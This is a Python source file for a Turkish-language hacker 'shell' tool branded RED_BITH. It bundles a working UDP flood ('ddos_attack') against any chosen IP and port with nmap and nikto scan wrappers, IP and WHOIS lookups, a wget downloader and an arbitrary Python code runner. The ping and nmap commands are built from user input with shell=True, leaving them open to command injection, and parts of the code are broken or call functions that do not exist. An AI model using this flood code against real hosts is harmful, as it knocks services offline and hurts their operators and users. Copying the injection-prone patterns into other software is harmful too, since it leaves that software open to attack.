import subprocess
import socket
import random
import os

def check_gui_file():
    gui_file_path = os.path.join("shl", "gui.txt")
    return os.path.exists(gui_file_path)

def create_gui_file():
    gui_file_path = os.path.join("shl", "gui.txt")
    with open(gui_file_path, 'w') as gui_file:
        gui_file.write("This is a GUI file created by the shell.")

if os.name == 'posix':
    os.system('clear')
elif os.name == 'nt':
    os.system('cls')

print("""\033[31m 

 ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░░   ░    ░    ░ ░  ░      ░         ░    ░   ▒   ░      ░   
   ░        ░  ░   ░                   ░  ░     ░  ░       ░   
                 ░                                             

note: You can start shell with one command! write: python shell.py !
""")

def ping(ip_address):
    command = f"ping {ip_address}"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        print(f"\nPing başarıyla gerçekleştirildi. Sonuçlar:\n{result.stdout}")
    else:
        print(f"\nPing başarısız. Hata:\n{result.stderr}")

def show_file_content(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            print(f"\nDosya içeriği:\n{content}")
    except FileNotFoundError:
        print(f"\nHata: Dosya bulunamadı. Lütfen geçerli bir dosya yolu girin.")
    except Exception as e:
        print(f"\nBir hata oluştu: {e}")



def ddos_attack(target_ip, target_port, packet_count):
    print("""\033[31m
    ###########################
    #  T00L - By RED_BITH     #
    #  ATTACK- DDOS           #
    #  READY FOR ATTACK       #
    ###########################
    """)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(3000)
    count = 0

    try:
        for _ in range(packet_count):
            sock.sendto(bytes, (target_ip, target_port))
            count += 1
            print("\033[92mATTACKING, sent packets: %s\033[0m" % (count))
    except KeyboardInterrupt:
        print("\033[91mAttack interrupted by user.\033[0m")
    finally:
        sock.close()

def run_ping(target_ip):
    try:
        command = f"ping -c 4 {target_ip}"  # -c 4, 4 paket gönder demektir
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            print(f"\nPing başarıyla gerçekleştirildi. Sonuçlar:\n{result.stdout}")
        else:
            print(f"\nPing başarısız. Hata:\n{result.stderr}")
    except Exception as e:
        print(f"\nBir hata oluştu: {e}")

def list_network_connections():
    try:
        os.system("netstat -a")
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print("\nAğ bağlantıları başarıyla listelendi. Sonuçlar:\n{result.stdout}")
            print(" ")
            return
        else:
            print("\nAğ bağlantıları listelenirken bir hata oluştu. Hata:\n{result.stderr}")
    except Exception as e:
        print("\nBir hata oluştu: {e}")

def infogather():
    import requests
    from bs4 import BeautifulSoup
    from colorama import Fore, Style
    import time
    import os
    import json
    import getmac

    class IPQuery:
        def __init__(self, ip):
            self.ip = ip
            self.ipapi_url = f"https://ipapi.co/{ip}/json/"
            self.ipinfo_url = f"https://ipinfo.io/{ip}/json"

        def make_request(self, url):
            try:
                response = requests.get(url)
                response.raise_for_status()
                return response.json()
            except requests.exceptions.HTTPError as errh:
                print(f"HTTP Error: {errh}")
                return None
            except requests.exceptions.ConnectionError as errc:
                print(f"Error Connecting: {errc}")
                return None
            except requests.exceptions.Timeout as errt:
                print(f"Timeout Error: {errt}")
                return None
            except requests.exceptions.RequestException as err:
                print(f"Oops, Something went wrong... {err}")
                return None

        def get_ipapi_info(self):
            ipapi_data = self.make_request(self.ipapi_url)
            return ipapi_data

        def get_ipinfo_info(self):
            ipinfo_data = self.make_request(self.ipinfo_url)
            return ipinfo_data

        def get_mac_address(self):
            mac_address = getmac.get_mac_address(ip=self.ip)
            return mac_address

        def perform_query(self):
            ipapi_info = self.get_ipapi_info()
            ipinfo_info = self.get_ipinfo_info()
            mac_address = self.get_mac_address()

            return {
                "ipapi_info": ipapi_info,
                "ipinfo_info": ipinfo_info,
                "mac_address": mac_address
            }

    def whois_lookup(domain):
        # Domain için WHOIS sorgusu yapma
        url = f'https://www.whois.com/whois/{domain}'
        response = requests.get(url)
    
        # WHOIS verilerini çekme ve işleme
        soup = BeautifulSoup(response.text, 'html.parser')
        whois_data = soup.find('pre', class_='df-raw')
    
        if whois_data:
            print(Fore.GREEN + f"WHOIS Bilgileri {domain}:\n{whois_data.text}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"WHOIS Bilgileri {domain} bulunamadı." + Style.RESET_ALL)

    def manual_ip_query():
        # Kullanıcıdan IP adresi girmesini iste
        ip = input("Lütfen bir IP adresi girin: ").strip()
        print(f"Manuel olarak sorgulanan IP adresi: {ip}\n")

        ip_query = IPQuery(ip)
        query_result = ip_query.perform_query()

        if query_result["ipapi_info"] and query_result["ipinfo_info"]:
            print("ipapi.co Bilgileri:")
            print(json.dumps(query_result["ipapi_info"], indent=2))

            print("\nipinfo.io Bilgileri:")
            print(json.dumps(query_result["ipinfo_info"], indent=2))

            print("\nMAC Adresi:")
            print(query_result["mac_address"])
        else:
            print("IP info request failed.")

    def main():
        while True:
            print("\n1. WHOIS Sorgusu")
            print("2. IP Sorgusu (Manuel IP)")
            print("3. Çıkış")
        
            choice = input("Seçiminiz: ")
        
            if choice == '1':
                target_domain = input("Hedef domain: ").strip()
                whois_lookup(target_domain)
            elif choice == '2':
                manual_ip_query()
            elif choice == '3':
                print(Fore.YELLOW + "Programdan çıkılıyor." + Style.RESET_ALL)
                break
            else:
                print(Fore.RED + "Geçersiz seçenek. Lütfen tekrar deneyin." + Style.RESET_ALL)

    if __name__ == "__main__":
        print("""\033[31m

     ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
    ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
    ▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
    ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
    ░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
    ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
      ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
      ░░   ░    ░    ░ ░  ░      ░         ░    ░   ▒   ░      ░   
       ░        ░  ░   ░                   ░  ░     ░  ░       ░   
                     ░                                             
          """)
        time.sleep(2)
        os.system("pip install requests")
        os.system("pip install beautifulsoup4")
        os.system("pip install colorama")
        os.system("pip install getmac")
        os.system("clear")
        main()


def download_file():
    print("""\033[31m

     ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
    ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
    ▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
    ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
    ░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
    ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
      ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
      ░░   ░    ░    ░ ░  ░      ░         ░    ░   ▒   ░      ░   
       ░        ░  ░   ░                   ░  ░     ░  ░       ░   
                     ░                                            


    """)
    url = input("Lütfen indirmek istediğiniz dosyanın URL'sini girin: ")
    destination = input("Lütfen dosyayı kaydetmek istediğiniz konumu ve adını girin (örneğin: /path/to/file.txt): ")

    try:
        # wget komutunu subprocess ile çağırma
        subprocess.run(["wget", url, "-O", destination], check=True)
        print(f"\033[32mDosya başarıyla indirildi. Kaydedildi: {destination}")
    except subprocess.CalledProcessError as e:
        print(f"\033[33mHata! Dosya indirilemedi. Hata Mesajı: {e}")

def google_search(query):
    import requests
    from bs4 import BeautifulSoup
    import sys
    
    search_url = f"https://www.google.com/search?q={query}"
    try:
        response = requests.get(search_url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        results = soup.find_all('div', class_='BNeawe vvjwJb AP7Wnd')
        
        if not results:
            print("\033[33mArama sonuçları bulunamadı.")
            return
        
        print("Arama Sonuçları:")
        for i, result in enumerate(results, 1):
            print(f"{i}. {result.text}")

    except requests.exceptions.HTTPError as errh:
        print(f"HTTP Error: {errh}")
    except requests.exceptions.ConnectionError as errc:
        print(f"Error Connecting: {errc}")
    except requests.exceptions.Timeout as errt:
        print(f"Timeout Error: {errt}")
    except requests.exceptions.RequestException as err:
        print(f"Oops, Something went wrong... {err}")



        

def ascii():
    print("""\033[31m

 ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░░   ░    ░    ░ ░  ░      ░         ░    ░   ▒   ░      ░   
   ░        ░  ░   ░                   ░  ░     ░  ░       ░   
                 ░                                             
""")
def run_nikto():
    target_url = input("Url:")
    os.system("nikto -h " + target_url)
    print("\033[32m\nNikto çalıştırıldı. Sonuçlar:\n{result.stdout}\nHata Mesajı:\n{result.stderr}")

import subprocess
# ...

def run_python_code():
    print("Python kodunu girin. Çıkış için 'exit' yazın.")

    while True:
        user_input = input("Python Kodu: ")

        if user_input.lower() == "exit":
            print("Çıkılıyor.")
            break

        try:
            result = subprocess.run(["python", "-c", user_input], capture_output=True, text=True)

            if result.returncode == 0:
                print("\nÇıktı:")
                print(result.stdout)
            else:
                print("\nHata:")
                print(result.stderr)

        except subprocess.CalledProcessError as e:
            print("\n\033[33mBir hata oluştu:")
            print(e)

        except Exception as e:
            print("\n\033[33mBir hata oluştu:")
            print(str(e))

# Diğer fonksiyonlarda benzer hata kontrolü ekleyin.

# ...

def nmap_scan(target_ip):
    try:
        command = f"nmap {target_ip}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            print(f"\nNmap taraması başarıyla gerçekleştirildi. Sonuçlar:\n{result.stdout}")
        else:
            print(f"\nNmap taraması başarısız. Hata:\n{result.stderr}")
    except Exception as e:
        print(f"\nBir hata oluştu: {e}")

import random
def sakayap():
    jokes = [
        "Neden bilgisayarlar asla yalan söylemez? Çünkü onlar yalnızca mantık kullanır!",
        "Niçin C# öğreniyorsun? Çünkü hiç Java'na vaktim yok!",
        "Neyzen Tevfik snei görse alkolü bırakırdı sal şu pc yi!",
        "Şu anda hazır kod kullanmak yerine yapmayı deneyebilirdin! zavallı seni :D",
        "Fakir çalmasını iyi beceremediği için fakirdir ~RTE~",
        "Ben ekonomistim! ~RTE~",
        "Bak bu shellide Masonlar yapti hepsi o israilin abdnin oyunu!.",
        """Bu kodları yazarken kız bir arkadaşım bi yakınıyla görüşmüş, 
        benim kafa gidik tabi çocuğun ismini sordum uzay diyince bende uzay mekiği haha dedim 
        kız engellemiş amq""",
        "Adamın biri kodmuş koyalayıp projeye dikmişler :D",
        "AL ELİNE TARAĞİ SOK PC YE KARTİ",
        "Bı kızla tnıştım neyse iyi gidioz falan, kız Yazılım okuyor Bill Gates fanı çıktı kapitalist oç",
        "HAYIR DOSTUM BU SADECE BENİM KODUM DEİL BU HEPİMİZİN KODU! (komunistim)",
        "Eğer sende sosyalistsen kodumu kullanan bir ezik olmuyorsun!?!??!",
    ]

    joke = random.choice(jokes)
    print(f"\nMizah: {joke}")



def clear_console():
    if os.name == 'posix':
        os.system('clear')
        print("""\033[31m
        
 ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░░   ░    ░    ░ ░  ░      ░         ░    ░   ▒   ░      ░   
   ░        ░  ░   ░                   ░  ░     ░  ░       ░   
                 ░                                             


        """)
    elif os.name == 'nt':
        os.system('cls')
        print("""\033[31m

 ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░░   ░    ░    ░ ░  ░      ░         ░    ░   ▒   ░      ░   
   ░        ░  ░   ░                   ░  ░     ░  ░       ░   
                 ░                                             
""")

if __name__ == "__main__":
    print("Merhaba! Lütfen bir komut yazın.")
    print("\033[31m(komutlar için: https://github.com/Red_BITH/TCWBF-TOOL/shl/commands.txt)")
    
    command_history = []
    current_index = 0
    
    while True:
        user_input = input("Komut: ")
        
        if user_input.lower() == "exit":
            print("Programdan çıkılıyor.")
            break
        if user_input.lower() == "infog":
            infogather()
        
        if user_input.lower() == "rnikto":
            run_nikto()

        if user_input.lower() == "showgui":
            show_gui()
        
        
        if user_input.lower() == "search":
                clear_console()
                ascii()
                print("\033[32mMerhaba! Lütfen aramak istediğiniz anahtar kelimeyi girin veya 'exit' yazarak çıkın.")
                while True:
                    user_input = input("Anahtar Kelime: ")
                
                    if user_input.lower() == "exit":
                        print("Programdan çıkılıyor.")
                        break

                    google_search(user_input)

   
        
        if user_input.lower() == "history":
            print("Komut geçmişi:")
            for cmd in command_history:
                print(cmd)
            continue
        if user_input.lower() == "lnet":
            list_network_connections()
        
        if user_input.lower() == "clear" or user_input.lower() == "cls":
            clear_console()
            continue
        if user_input.lower() == "rping":
            run_ping()
        
        if user_input.lower() == "install":
            download_file() 
        
        if user_input.lower() == "saka":
            sakayap()

        try:
            command, params = user_input.split(" ", 1)
            if command.lower() == "ping":
                ping(params)
            elif command.lower() == "ddos":
                ip, port, packet_count = params.split(" ")
                ddos_attack(ip, int(port), int(packet_count))
            elif command.lower() == "showfile":
                show_file_content(params)
            elif command.lower() == "nmap":
                nmap_scan(params)
            elif command.lower() == "lnet":
                list_network_connections(params)
            elif command.lower() == "token":
                token_id = params.strip()
                if token_id == "uae0134758493DJFGFD1039456":
                    if not check_gui_file():
                        create_gui_file()
                        print("GUI dosyası oluşturuldu.")
                    else:
                        print("Hata: GUI dosyası zaten var. Tekrar oluşturulamaz.")
                else:
                    print("Hata: Geçersiz token ID.")
            elif command.lower() == "showgui":
                show_gui()
            else:
                print("Geçersiz komut. Lütfen düzgün formatda girin.")
        except ValueError:
            print("Geçersiz komut. Lütfen düzgün formatda girin.")
        
        command_history.append(user_input)
        current_index = len(command_history)
        
    print("Programdan çıkıldı.")
    clear_console()

